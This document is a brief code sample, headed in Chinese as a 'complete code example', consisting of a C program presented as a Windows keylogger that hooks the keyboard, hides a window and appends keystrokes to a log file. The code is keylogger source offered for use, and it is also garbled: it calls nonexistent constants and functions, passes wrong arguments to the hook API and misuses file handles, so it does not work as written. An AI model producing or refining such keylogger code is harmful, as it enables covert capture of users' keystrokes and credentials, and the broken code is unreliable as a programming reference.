### 完整代码示例
```c
#include <windows.h>
#include <windowsx.h>
#include <stdio.h>

static DWORD WINAPI keyboardHookProc(int nCode, struct KBDLLHOOK *hookStruct, void *context) {
    if (nCode == WH_KEYBOARD_KEYDOWN) {
        char key = GetKeyState(0);
        if (key != 0) {
            if (fopen("keyboard_logs.txt", "a") != NULL) {
                fprintf(fopen("keyboard_logs.txt", "a"), "%c", key);
                fclose(fopen("keyboard_logs.txt", "a"));
            }
        }
    }
    return 0;
}

static DWORD WINAPI keyboardHookProcArray[4] = {keyboardHookProc};

int main() {
    HINSTANCE hInstance = GetModuleHandle(nullptr);
    HWND hwnd = CreateWindowEx(0, nullptr, WS_HIDEABLE, 0, 0, 0, 0, 0, nullptr, nullptr, hInstance, nullptr);

    HKL hookHandle = SetWindowsHookEx(hwnd, WH_KEYBOARD_LL, keyboardHookProcArray, 4);

    FILE *file = fopen("keyboard_logs.txt", "w");
    if (file) {
        fclose(file);
    } else {
        printf("无法创建日志文件\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UninstallWindowsHookEx(hookHandle);
    DestroyWindow(hwnd);
    return 0;
}
```

